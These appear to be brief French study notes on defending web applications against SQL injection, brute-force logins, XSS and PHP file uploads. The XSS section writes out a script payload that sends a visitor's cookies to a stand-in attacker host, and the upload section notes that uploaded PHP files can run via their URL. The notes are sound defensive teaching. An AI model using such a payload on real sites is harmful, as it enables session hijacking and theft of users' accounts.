1. Contre l'injection SQL

    Sanitisation des Entrées
    La sanitisation (ou nettoyage) des entrées consiste à modifier les données envoyées par l'utilisateur pour enlever ou échapper les caractères 
    potentiellement dangereux, 
    comme les guillemets ou les points-virgules, qui pourraient être utilisés dans une injection SQL.

    Les requêtes préparées (également appelées paramétrées) sont un moyen efficace de protéger votre application contre les injections SQL. 
    Les requêtes préparées s'assurent que les entrées de l'utilisateur sont traitées comme des données et non comme du code SQL



2. Contre le brute force

    Limiter le taux de tentatives de connexion
    Implémentez une limite sur le nombre de tentatives de connexion qu'un utilisateur peut effectuer dans un certain laps de temps. 
    Par exemple, après trois tentatives échouées, vous pouvez bloquer l'utilisateur temporairement.


3.Injection XSS (Cross-Site Scripting)

    Échapper les Entrées Utilisateur : Utilisez des fonctions d'échappement pour traiter les données que les utilisateurs peuvent saisir.
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "http://malicious-site.com/steal?cookie=" + document.cookie, true);
      xhr.send();
    </script>


4.sécurité des fichiers téléversés
       
    on peut telecharger un fichier php puis y acceder vias l url et le code sera executer 
    Ne jamais autoriser le téléchargement de fichiers PHP ou d'autres types de fichiers exécutables. 
    